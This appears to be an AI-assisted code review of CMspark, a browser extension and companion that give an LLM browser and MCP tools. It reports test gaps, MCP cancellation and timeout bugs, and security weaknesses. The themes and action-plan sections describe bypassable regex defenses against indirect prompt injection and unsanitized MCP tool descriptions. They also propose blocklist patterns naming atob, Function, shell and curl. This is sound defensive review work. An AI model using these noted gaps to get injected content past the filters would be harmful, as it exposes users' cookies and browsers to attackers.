### No end-to-end integration test for WebSocket ↔ Extension ↔ LLM tool roundtrip

**Location:** `companion/tests/server.test.ts:254`

**Evidence:** `server.test.ts` uses `createMockWebSocket()` — a stub with `readyState=1` and a `send` spy. Grep for `new WebSocket|ws://127|WebSocketServer` across `tests/` returns zero real-WS matches. `tests/integration/` contains only `daemon-cli.test.ts` and `server-lock.test.ts`. No test binds the real `WebSocketServer`, opens a real `ws` client, sends `{type:'tool.execute'}`, delivers the extension's `tool.result` reply via `handleToolResult`, and verifies the executor resolves. The timeout path executes in "let it timeout naturally" tests but they never assert the timeout error shape `{ success: false, error: "Tool execution timeout after 15000ms" }`. No test verifies double-resolution is a no-op, timer-leak cleanup, or the timeout-vs-result race. (`handleToolResult` IS unit-tested in isolation at `server.test.ts:614-665`, so resolution primitives are covered — the gap is the integration glue.)

**Impact:** The Promise-bridge that pairs `tool.execute` dispatches with `tool.result` replies (the core message-flow loop documented in CLAUDE.md) — including timeout cleanup at `TOOL_EXECUTION_TIMEOUT_MS`, error path, double-resolution, timer leaks across connection drops at `server.ts:1003-1008` — has no integration coverage. Regressions would not be caught.

**Recommendation:** Add `tests/integration/ws-roundtrip.test.ts` that: starts the real Companion `WebSocketServer` on an ephemeral port, connects a `ws` client, invokes the tool executor with a known `tool_call_id`, simulates the extension by sending `{type:'tool.result', tool_call_id, result}`, and asserts the executor Promise resolves. Add a parallel test that withholds the reply and asserts the timeout error shape. Add a test that a second `handleToolResult` for the same id is a no-op.

### `mcp.test.ts` integration test depends on live `npx` + `@modelcontextprotocol/server-filesystem` — brittle, will fail offline / behind firewall

**Location:** `companion/tests/mcp.test.ts:151`

**Evidence:** The test calls `new McpClient('filesystem', {command:'npx', args:['-y','@modelcontextprotocol/server-filesystem', '/Users/chenhu/Projects/cmspark']})` then `client.connect()`, asserting `meta.tools.length>0` and that `read_text_file` is present. This spawns a real subprocess requiring npx on PATH, npm-registry network access on first run, the package not being yanked, and the hardcoded absolute path `/Users/chenhu/Projects/cmspark` to exist on the test machine. No `t.skip`/env-var/CI guard. The companion's `npm test` runs `node --test .test-dist/tests/**/*.test.js`, so this test is on by default.

**Impact:** Red builds on CI without network, on any dev machine other than the author's, or if the maintainer's home directory changes — unrelated to code under test. Upstream rename of `read_text_file` breaks the build.

**Recommendation:** (a) Guard with skip on ENOENT/timeout; (b) replace with an in-repo fake stdio MCP server (a tiny node script that speaks the initialize handshake and advertises one tool) so the test is hermetic; (c) at minimum replace the hardcoded path with `os.tmpdir()`. Keep the live-server test opt-in only.

### `bridge.test.ts` context-builder pairing tests assert on simulated behavior, not the real adapter strip logic

**Location:** `companion/tests/adapter.test.ts:177`

**Evidence:** The tests 'context builder must strip tool_calls with no matching tool result' (line 177) and 'context builder validates pairing when tool result exists' (line 208) manually re-implement the strip decision inline (`const shouldStrip = !!(assistantMsg.tool_calls && ... && !nextMsg)`) and assert against their own reimplementation. The comment at line 202 says "Simulate what adapter.ts does". The actual strip loop lives at `src/llm/adapter.ts:189-215` inside `chatCreate` (not exported, and is a full streaming LLM call, so impractical to test directly).

**Impact:** These tests pass even if the real adapter stripping logic is deleted or buggy. The regression they purport to guard against (OpenAI API rejecting `tool_calls` without matching `tool` results) is not actually covered.

**Recommendation:** Export a thin testable wrapper around the strip loop (e.g. `stripUnpairedToolCalls(messages): Message[]`) and feed it the unpaired/paired message arrays directly, asserting on its output rather than a reimplementation.

---

## MCP Deep-Dive Addendum (Lifecycle / Protocol / Cleanup)

> Supplementary pass over the MCP module focused on lifecycle, resource cleanup, JSON-RPC protocol correctness, and aggregation — the angles the security/tests/correctness dimensions did not cover. 10 new findings (3 high / 4 medium / 3 low).

### [high] MCP tool calls cannot be cancelled — `chat.abort` leaves MCP servers working
**Location:** `companion/src/mcp/client.ts:270-286`, `companion/src/server.ts:107-111`, `companion/src/llm/adapter.ts:57`
**Evidence:** `McpClient.callTool` wraps `this.client.callTool(...)` only in `withTimeout` (a `Promise.race` against `setTimeout`); it never passes the SDK's `RequestOptions.signal` to the underlying call. `createToolExecutor` does not thread an `AbortSignal` through to `executeMcpTool`, even though the adapter has `signal?: AbortSignal` and uses it for the OpenAI request (`{ signal }` at `adapter.ts:278`). The SDK type explicitly supports `options?: RequestOptions` with `signal?: AbortSignal`.
**Impact:** When the user clicks stop, the OpenAI request is aborted but any in-flight MCP tool call (e.g. a long-running `run_python`/shell tool on a stdio server) keeps executing server-side until `call_timeout_ms` (default 30s) or the server finishes. Repeated abort/retry cycles can stack multiple concurrent executions of the same expensive tool against the same MCP server.
**Recommendation:** Add an optional `AbortSignal` parameter to `createToolExecutor`, thread it through `executeMcpTool` → `manager.callTool` → `client.callTool`, and pass `{ signal }` as the SDK `RequestOptions`. When `withTimeout` fires, also call `controller.abort()` so the SDK sends a JSON-RPC `notifications/cancelled` and stops waiting.

### [high] `withTimeout` race leaves the SDK request pending forever after timeout
**Location:** `companion/src/mcp/client.ts:357-367`
**Evidence:** `withTimeout` does `Promise.race([p, timeout])`. When the timeout branch wins, the original promise `p` is never cancelled or awaited — the SDK's response handler for that `request.id` remains in `_responseHandlers`, and any late server reply still invokes its resolver (silently). For stdio servers, the child process keeps running until killed by `close()`.
**Impact:** On a chatty/hung MCP server, every timed-out call leaves a dangling handler; under sustained timeouts (e.g. a server that hangs after the first call) the SDK's response-handler map grows unbounded until the client is closed. Late responses also fire unobservable side-effects (resolved promises whose result is discarded).
**Recommendation:** Wrap each call in an `AbortController`, pass `signal` to the SDK, and on timeout call `controller.abort()` so the SDK both removes the handler AND sends `notifications/cancelled` per JSON-RPC 2.0 spec.

### [high] Dead-server cap is never cleared when a server is removed from config
**Location:** `companion/src/mcp/manager.ts:99-104` (Removed branch), contrast lines 115/127 where `deadServers.delete(name)` IS called
**Evidence:** The "Removed" loop calls `this.stopClient(name)` but never `this.deadServers.delete(name)` nor `this.restartAttempts.delete(name)`. If the user deletes a server that hit the 5-crash cap, then later re-adds a new server with the same name, `scheduleRestart` short-circuits at `if (this.deadServers.has(name)) return` (line 225) on the very first failure — the new server gets only one shot.
**Impact:** Reusing a server name after a previously-crashed server was removed produces silently broken behavior: the new server starts fine but, on its first hiccup, is permanently marked dead with no restart attempts. The UI shows no clue why.
**Recommendation:** In the "Removed" branch, also call `this.deadServers.delete(name)`, `this.restartAttempts.delete(name)` (timer is already cleared in `stopClient` at line 190). Symmetry with the "Added/changed" path.

### [medium] `restart_count` is plumbed to the UI but never incremented — always reads 0
**Location:** `companion/src/mcp/types.ts:54`, `companion/src/mcp/client.ts:38`, `companion/src/mcp/manager.ts` (no writes)
**Evidence:** `restart_count` is declared in `types.ts:54`, initialized to 0 in `client.ts:38`, surfaced in the manager's not-yet-started placeholder (`manager.ts:342`). No code path ever mutates `_connection.restart_count`. The manager tracks restart history in `restartAttempts: Map<string, number[]>` but never reflects its length back into `restart_count`.
**Impact:** UI elements surfacing `meta.connection.restart_count` always show 0, hiding the actual restart history. Operators relying on this field to gauge server health see misleading data.
**Recommendation:** In `scheduleRestart`, after pushing to `restartAttempts`, set `client._connection.restart_count = attempts.length`. Reset to 0 on successful connect alongside `restartAttempts.delete(name)` at `manager.ts:164`.

### [medium] `transport.onclose` unconditionally overwrites `dead` status back to `disconnected`
**Location:** `companion/src/mcp/client.ts:105-110, 178-183 (markDead), 185-196 (close)`
**Evidence:** `transport.onclose` calls `this.setStatus("disconnected")` without checking if the connection is already `"dead"`. `markDead` writes `"dead"` directly via `this._connection.status = "dead"`. If `transport.onclose` fires after `markDead` (entirely possible: `markDead` runs synchronously inside `scheduleRestart`, transport cleanup is async), the status silently reverts to `"disconnected"` and the UI loses the "permanently dead" signal. Same issue in `close()` (line 194) which always sets `"disconnected"`.
**Impact:** After a server is given up on, late transport callbacks can flip its UI status to "disconnected", confusing users who expect to see the dead state and the failure reason.
**Recommendation:** Guard `setStatus` calls: in `transport.onclose` and `close()`, only downgrade to `"disconnected"` if `this._connection.status !== "dead"`. Alternatively, set a separate `_permanentlyDead` flag in `markDead` that survives status overwrites.

### [medium] `applyConfig` removes/restarts a server but does not grant in-flight tool calls a grace period — LLM gets `Connection closed` mid-stream
**Location:** `companion/src/mcp/manager.ts:99-116`, `companion/src/mcp/client.ts:185-196`
**Evidence:** On a config change requiring restart, `applyConfig` calls `await this.stopClient(name)` which calls `client.close()`. `McpClient.close()` triggers the SDK `_onclose` handler which aborts all in-flight request handlers and rejects their promises with `McpError(ConnectionClosed)`. There is no grace period or queue drain. Compare with the extension-side tool-call path in `ws.on("close")` (`server.ts:1003-1012`) which deliberately grants a 5-second grace period — MCP tool calls get none.
**Impact:** If a user edits an MCP server's config while the LLM is mid-tool-call against it, the call rejects with `"Connection closed"` even though the call might have completed in another few hundred ms. The LLM sees an opaque error and may retry against a stale route or give up.
**Recommendation:** Either (a) match the WS-side 5s grace period by deferring `client.close()` until in-flight calls drain (track an `activeCallCount`), or (b) surface a clearer error to the LLM: `"MCP server ${name} is restarting due to config change; please retry in a moment"`.

### [medium] Per-call timeout gives the LLM an opaque `"MCP timeout: call X > 30000ms"` — no recovery hint
**Location:** `companion/src/mcp/client.ts:357-367`, `companion/src/server.ts:522-524`
**Evidence:** On timeout, `withTimeout` rejects with `new Error(\`MCP timeout: ${label}\`)`. `executeMcpTool` catches this at `server.ts:522-523` and returns `{ success: false, error: \`MCP call failed: ${err.message}\` }` — the LLM sees `"MCP call failed: MCP timeout: call filesystem/read_text_file > 30000ms"`. No suggestion to retry, narrow args, or check server status. The `call_tool_finished` notification only fires on success/explicit-error result, not on the timeout throw, so the UI doesn't even show the call as failed.
**Impact:** The LLM has no signal whether to retry (transient), narrow the request (too much data), or pick another tool. It often retries identically and burns through more rounds.
**Recommendation:** Wrap the timeout error with an LLM-readable hint (e.g. `"MCP call timed out after ${ms}ms — the server may be slow, busy, or hung. You can retry once, try smaller arguments, or skip this tool."`). Emit `mcp.tool_call_finished` with `success: false` from the catch block at `server.ts:522` so the UI shows the failure.

### [low] `confirm-cache` TOCTOU: approval can be revoked between `isApproved()` and `manager.callTool`
**Location:** `companion/src/server.ts:461-503`, `companion/src/mcp/confirm-cache.ts:27-32`
**Evidence:** `executeMcpTool` checks `cache.isApproved(cacheKey)` (line 463), then awaits `securityConfirmations.request(...)` if needed (line 478), then `cache.approve(cacheKey)` (line 500), then awaits `manager.callTool` (line 507). There is no re-check after the await. If between approve and callTool a concurrent `revoke(key)` (e.g. user clicks "revoke trust" in UI, or `clearServer` runs because trust_level changed to `manual` mid-flight) fires, the call still proceeds.
**Impact:** Narrow window where a user-initiated revocation doesn't take effect for a tool call that already passed the gate. Low severity because the gap is sub-second and revocation is not currently exposed via an in-flight-call UI.
**Recommendation:** Either accept as documented behavior (call started under a valid approval), or snapshot the approval decision and re-check immediately before `manager.callTool` for `first-use`/`trusted` paths, throwing `"approval revoked"` if it changed.

### [low] Subprocess stderr is captured to an 8KB ring but the `stderr` event has no manager listener
**Location:** `companion/src/mcp/client.ts:100` (emits `"stderr"`), `companion/src/mcp/manager.ts:204-221` (attachClientListeners)
**Evidence:** `McpClient.connect()` registers an `onStderr` callback that appends to `_stderrBuffer` and `this.emit("stderr", chunk)`. The manager's `attachClientListeners` never subscribes to `"stderr"`. So the event is dead, and stderr only surfaces via the cached `stderrTail` getter (used in the start-failure log line at `manager.ts:169`).
**Impact:** For long-running servers, after-startup stderr (warnings, deprecation notices, errors during tool execution) is captured in the 8KB buffer but only inspectable via `stderrTail` — no live log stream. If a tool starts failing, the operator can't see why without restart.
**Recommendation:** Either subscribe to `"stderr"` in `attachClientListeners` and pipe to `logger.debug("mcp.client.stderr", { server, chunk })`, or delete the `emit("stderr")` call to make intent clear.

### [low] `buildSpawnPath` scans `~/.nvm/versions/node/*` synchronously on every transport creation
**Location:** `companion/src/mcp/transport.ts:32-86`, called per-server at line 93
**Evidence:** `createTransport` is called once per `McpClient.connect()`. For stdio servers it calls `buildSpawnPath()`, which does `fs.existsSync` + `fs.readdirSync` + `fs.statSync` for every nvm node version — synchronous filesystem I/O on the main thread, invoked per server, including on every restart attempt.
**Impact:** With several stdio servers and a crashing one in a 5-restart backoff loop, this performs repeated synchronous directory scans on the event loop. Minor latency blip per call (<5ms typically), but adds up on busy machines with many nvm versions.
**Recommendation:** Memoize `buildSpawnPath()` at module load — PATH is process-stable. Compute once into a module-level `let cachedPath: string | undefined` and reuse. `config.env.PATH` overrides happen after the cache lookup, so caching is safe.

---

## Themes

**Documented security model is aspirational, not enforced.** The most pervasive theme: CLAUDE.md A4 describes a three-tier privilege system + risk engine + page scanner, but all three are dead code (`privilege-manager.ts`, `risk-engine.ts`, `page-scanner.ts` have zero runtime consumers). The actual runtime defense is a cookie-domain gate plus a regex blocklist on `evaluate`/`osascript` that is trivially bypassable. Until this is reconciled — either wire the layers in or update the docs — every security review of CMspark starts from a false picture.

**MCP integration is undertested and under-guarded.** The MCP subsystem is newly added and carries the classic pattern: working aggregator/client tests, zero coverage on the security- and reliability-critical paths (`McpConfirmCache` cross-session isolation, `McpManager` crash-loop protection, `validateMcpServerConfig`, `createTransport`). Combined with unsanitized tool descriptions reaching the LLM, session-scoped "first-use" approvals with no TTL, and the half-wired per-thread selection seam, MCP is the highest-leverage area for both bugs and security regressions in the near term.

**Type boundaries between LLM, WS, and tools are unenforced.** LLM-produced JSON (`adapter.ts:369`) and WS-inbound messages (`server.ts:917`) cross the runtime boundary as `any`, dispatched to subprocesses and external MCP servers with no schema gate. `validateToolCallArguments` is dead code, `zod` is installed dead weight, and the hand-rolled `validateWsMessage` is partial. This is the kind of boundary where a hallucinated shape becomes a silent bug or a coercion-hidden security scan bypass.

**Sensitive data bleeds into persistent storage.** httpOnly cookie values and high-risk `evaluate` code bodies are JSON-stringified into `history.db` verbatim and retained for 30 days, exfiltrable both via filesystem read and via the ungated `history.export` WS route. The codebase already has a `redactLogData` helper in `logger.ts` that is simply not wired into history persistence.

**Indirect prompt injection is defended by regex theater.** Three independent regex blocklists (`security.ts:85`, `risk-engine.ts:62`, page-sanitizer `:70`) attempt to filter dangerous APIs and injection phrases, but all are finite and bypassable, the strongest pattern set is dead code, and page content reaches the LLM with no untrusted-content framing. The confirmation gate is a strict subset of the regex — no match means silent auto-execution.

**Large files concentrate concerns and resist testing.** `message-router.ts` (1244 LOC, one switch) and `server.ts` (1047 LOC) hold routing, validation, security helpers, and business logic together, making per-domain unit tests impractical and inviting copy-paste duplication (the LLM-config-merge appears three times; the SSRF/fetch block twice; `new OpenAI()` eight times). Splitting along domain lines would also let the existing security helpers move to where they belong.

## Strengths

- **Two-tier topology with clear trust boundary:** Extension is genuinely thin (browser ops only); all reasoning, state, and security live in Companion over a single loopback WS. The LLM is treated as untrusted output (jailbreak detection, DOMPurify on render) and tool args as untrusted input (prototype-pollution guards, schema intent).
- **Layered confirmation with server-issued HMAC:** Even though the extension no longer re-verifies the token, the companion IS authoritative: `checkHighRiskExecution` → interactive `SecurityConfirmationManager.request` → `securityPolicy.issueToken` → constant-time server-side validation. The trust model is companion-authoritative and well-documented in code comments.
- **Security-scanner infrastructure exists and is partially wired:** `redactLogData`, jailbreak detection, prototype-pollution guards at four sites, SSRF + size-cap + redirect-rejection on URL imports, and MCP trust-level gating are all present — the gaps are mostly wiring (redact into history, schemas into dispatch, risk-engine into the gate) rather than missing capabilities.
- **Mutating handlers invalidate their own caches:** `skill.import`/`skill.delete`/`skill.craft` already call `skillEngine.refresh()` after mutation, so the `skill.list` redundant refresh is a fixable oversight, not an architectural flaw.

## Recommended Action Plan

1. **[critical] Decide the privilege system's fate.** In `companion/src/server.ts:107-302` `createToolExecutor()`, either wire `PrivilegeManager.getMode(threadId)` + `getRiskDecision()` before tool dispatch, or delete `companion/src/security/privilege-manager.ts`, `companion/src/security/risk-engine.ts`, the `privilege_mode` config field, and update `CLAUDE.md` A4. Pick one this week.
2. **[high] Flip `evaluate`/`osascript` to default-deny.** In `companion/src/security.ts:163-165` change `checkHighRiskExecution` so the confirmation prompt fires for ALL `evaluate`/`osascript_eval` calls, with the regex used only to escalate the risk preview. Add `location`/`location.href`/`import()`/`atob`+Function/`globalThis` indexing/`Image().src` to `DANGEROUS_API_PATTERNS`.
3. **[high] Redact cookie values and high-risk code from `history.db`.** In `companion/src/llm/adapter.ts:409-420`, before `historyStore.record`, redact per-tool: cookie tools store names + domain + value hash only; `evaluate`/`osascript_eval` store code hash + length. Add a `sensitive` marker to `companion/src/bridge/tool-definitions.ts` and apply via the existing `redactLogData` helper. Gate `history.export` (`companion/src/message-router.ts:1014`).
4. **[high] Add per-tool-call zod argument validation.** In `companion/src/llm/adapter.ts:369-372` after `JSON.parse`, call `validateToolCallArguments` (already at `tool-definitions.ts:636`) or `TOOL_ARG_SCHEMAS[toolName].parse(...)`; on failure return the recovery path at lines 379-396.
5. **[high] Add MCP module tests.** Cover `McpConfirmCache` (cross-session isolation, `approveServer`, `clearServer`, `pruneStaleSessions`), `McpManager` (`applyConfig` diff, `requiresRestart`, `scheduleRestart` dead-server cap), `createTransport` env/PATH, and `validateMcpServerConfig` + `mcp.add`/`mcp.update`/`mcp.delete` routing (including prototype-pollution patches).
6. **[high] Add WS↔Extension↔tool roundtrip integration test.** In `companion/tests/integration/ws-roundtrip.test.ts`, bind the real `WebSocketServer`, exercise the `tool.execute` → `tool.result` Promise bridge including timeout error shape, double-resolution no-op, and connection-drop cleanup at `companion.ts:1003-1008`.
7. **[medium] Wire MCP per-thread selection.** Add `mcp_selection_mode` + `active_mcp_server_ids` to `companion/src/threads/thread-manager.ts:7-19` with the same validation `skill_selection_mode` has; thread-context `getMcpToolsForThread(thread)` in `companion/src/mcp/manager.ts:274`; pass thread context from `adapter.ts:259`. Until wired, hide the toggle in the MCP UI.
8. **[medium] Add TTL/call-count cap to MCP "first-use" approvals.** In `companion/src/mcp/confirm-cache.ts:27-32`, re-prompt after N calls or M minutes; force "manual" for destructive-tool name patterns (`write|delete|exec|commit|rm|shell|curl`); wire `cache.clearSession(sessionId)` into `server.ts:998-1016` `ws.on("close")`; add a periodic `pruneStaleSessions()` timer.
9. **[medium] Scan MCP tool metadata for injection.** In `companion/src/mcp/aggregator.ts:50-104`, run tool/argument descriptions through the existing content-sanitizer before exposing to the LLM; refuse or quarantine flagged tools; cap description length.
10. **[medium] Fix the `skill.list` performance regression.** In `companion/src/message-router.ts:720-722` drop the unconditional `skillEngine.refresh()`; read from cache via `skillEngine.list()`. Add a separate `skill.refresh` message type if force-refresh is needed.
11. **[medium] Memoize the React message list.** In `chrome-extension/src/sidepanel/components/ChatView.tsx:89`, wrap the row in `React.memo` with a custom comparator and split the streaming bubble into its own subscriber.
12. **[medium] Add `navigate`/`create_tab` trust-domain gate.** In `companion/src/server.ts:107-302` `createToolExecutor`, add a confirmation tier for URLs outside `trusted_domains` or whose eTLD+1 differs from the current tab; block `chrome://`, `file://`, `data:` schemes.
13. **[medium] Delete dead-code traps.** Remove `companion/src/server/tool-executor.ts`, `companion/src/server/log-helpers.ts` (security-divergent duplicates of `server.ts`), and decide on `companion/src/security/{risk-engine,privilege-manager,page-scanner}.ts` per step 1.
14. **[medium] Make `historyStore` methods await `this.ready`.** In `companion/src/history/store.ts:108,124,149,166` either make async or gate with `this.ready.then(...)`. Surface double-init failures via logger instead of swallowing at `store.ts:69`. Investigate and likely remove the second `initServices()` at `companion/src/server.ts:895`.
15. **[high] Thread `AbortSignal` through MCP tool calls and fix `withTimeout` resource leak.** In `companion/src/mcp/client.ts:270-286,357-367`, pass SDK `RequestOptions.signal` to `callTool`, and on `withTimeout` fire `controller.abort()` so the SDK removes the handler AND sends JSON-RPC `notifications/cancelled`. Today, `chat.abort` leaves MCP servers running and timed-out requests leak handlers.
16. **[high] Clear `deadServers`/`restartAttempts` when a server is removed from config.** In `companion/src/mcp/manager.ts:99-104` "Removed" branch, also call `deadServers.delete(name)` and `restartAttempts.delete(name)`. Without this, re-adding a server with a previously-crashed name silently dies on the first hiccup.
17. **[medium] Wire `chat.abort` to MCP cancellation end-to-end.** Thread `AbortSignal` from `companion/src/llm/adapter.ts` through `createToolExecutor` (`companion/src/server.ts:107`) → `executeMcpTool`. Pair with item 15.
18. **[medium] Improve MCP error surfaces to the LLM.** In `companion/src/server.ts:522-524`, wrap timeout/close errors with actionable hints ("retry once, narrow args, server is restarting") and emit `mcp.tool_call_finished` with `success: false` from the catch block so the UI flags failures. In `applyConfig` (`manager.ts:99-116`), consider matching the WS-side 5s grace period before `client.close()`.
19. **[low] Decompose `message-router.ts` and dedupe helpers.** Extract `resolveEffectiveLLMConfig` (called from `message-router.ts:236,430,528`), split per-domain handlers under `routes/`, and move `isInternalIp`/`hasPrototypePollutionKey`/`validateMcpServerConfig`/`sanitizeConfig` into `security/input-validation.ts`. Extract `fetchTrustedText` to dedupe the `skill.import`/`knowledge.import` SSRF block.

## Methodology

8-dimension parallel review (Security & Threat Model; Architecture & Module Boundaries; MCP Module; Correctness, Error Handling & Async; Type Safety & Runtime Validation; Code Quality, Duplication & Dead Code; Performance & Resource Management; Testing Coverage & Quality) followed by adversarial verification of every candidate against the actual codebase. 43 candidate findings → 31 confirmed (12 refuted). Severity was adjusted downward on 13 confirmed findings where the verifier found the original impact analysis overstated. Every confirmed finding cites file:line evidence either read directly or reproduced by grep.

The dedicated MCP-dimension review agent failed to emit structured output within its retry budget (the only pipeline-stage failure of the run). A focused MCP lifecycle/protocol/cleanup addendum pass was run to recover those findings — see the "MCP Deep-Dive Addendum" section above for the 10 supplementary findings (3 high / 4 medium / 3 low).
